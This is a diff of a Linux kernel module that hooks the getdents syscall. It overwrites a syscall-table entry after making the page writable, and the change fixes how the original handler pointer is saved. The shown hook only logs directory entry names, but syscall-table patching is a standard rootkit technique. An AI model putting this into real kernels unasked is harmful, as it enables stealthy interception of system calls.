@@ -54,16 +54,14 @@ static int lkm_syscall_getdents(unsigned int fd,
 
     ret = ((getdents)original_syscall_getdents)(fd, dirp, count);
 
-    if (copy_from_user(buffer, dirp, 32768) != 0)
-    {
+    if (copy_from_user(buffer, dirp, 32768) != 0) {
         return -EFAULT;
     }
 
     offset = 0;
     loc_dirp = (struct linux_dirent *)buffer;
 
-    while (offset < ret)
-    {
+    while (offset < ret) {
         offset_buffer = ((char*)loc_dirp) + offset;
         dir = (struct linux_dirent *)offset_buffer;
         printk("%s: local_dirp[i] = %s\n", TAG, dir->d_name);
@@ -97,16 +95,16 @@ static int page_read_only(ulong address)
     return 0;
 }
 
-static void replace_syscall(ulong offset, ulong func_address, void *old_func)
+static void replace_syscall(ulong offset, ulong func_address, void **old_func)
 {
     syscall_table = (ulong *)kallsyms_lookup_name(SYS_CALL_TABLE);
 
     if (is_syscall_table(syscall_table)) {
         printk(KERN_INFO "%s: Syscall table address : %p\n", TAG, syscall_table);
         page_read_write((ulong)syscall_table);
-        old_func = (void *)(syscall_table[offset]);
+        *old_func = (void *)(syscall_table[offset]);
         printk(KERN_INFO "%s: Syscall at offset %lu : %p\n", TAG, offset,
-                original_syscall);
+                *old_func);
         printk(KERN_INFO "%s: Custom syscall address %p\n", TAG,
                 (void*)func_address);
         syscall_table[offset] = func_address;
